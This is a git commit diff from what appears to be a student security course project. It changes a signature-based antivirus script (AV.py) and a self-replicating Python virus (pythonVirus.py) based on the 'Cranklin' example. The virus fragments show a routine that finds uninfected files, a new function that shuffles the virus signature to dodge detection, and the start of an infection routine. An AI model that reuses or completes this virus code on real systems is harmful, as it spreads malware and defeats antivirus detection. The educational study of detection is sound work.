37413358e52e52a4822f566abbdef50b92738d5a
Zyxanax <prtong77@gmail.com>
2017-05-09 00:05:26 -0700

    AV works plz confirm
    Also moved shuffle text to the virus itself

--- AV.py
+++ AV.py
@@ -3,15 +3,6 @@ import datetime
 import random, array
 
 SIGNATURE = "CRANKLIN PYTHON VIRUS"
-def shuffle_text(SIGNATURE):
-    if isinstance(SIGNATURE, unicode):
-        temp= array.array('u', SIGNATURE)
-        converter= temp.tounicode
-    else:
-        temp= array.array('c', SIGNATURE)
-        converter= temp.tostring
-    random.shuffle(temp)
-    return converter()
 
 def search(path):
     filestoinfect = []
@@ -23,13 +14,15 @@ def search(path):
             infected = False
             for line in open(path+"/"+fname):
                 if SIGNATURE in line:
-                    infected = False
+                    infected = True
                     break
             if infected == True:
                 filestoinfect.append(path+"/"+fname)
-    filestoinfect = search(os.path.abspath("\Users\MANO\Downloads\ECS 189M\progAss1"))
-    for fname in filestoinfect:
-        print ("kjhkjh")
-        print (fname)
     return filestoinfect
+
+filestoinfect = search(os.path.abspath("/home/prong/Documents/ECS189m/project1"))
+for fname in filestoinfect:
+    print ("kjhkjh")
+    print (fname)
+
 	
--- pythonVirus.py
+++ pythonVirus.py
@@ -1,6 +1,17 @@
 import os
 import datetime
 SIGNATURE = "CRANKLIN PYTHON VIRUS"
+
+def shuffle_text(SIGNATURE):
+    if isinstance(SIGNATURE, unicode):
+        temp= array.array('u', SIGNATURE)
+        converter= temp.tounicode
+    else:
+        temp= array.array('c', SIGNATURE)
+        converter= temp.tostring
+    random.shuffle(temp)
+    return converter()
+
 def search(path):
     filestoinfect = []
     filelist = os.listdir(path)
@@ -16,6 +27,7 @@ def search(path):
             if infected == False:
                 filestoinfect.append(path+"/"+fname)
     return filestoinfect
+    
 def infect(filestoinfect):
     virus = open(os.path.abspath(__file__))
     virusstring = ""
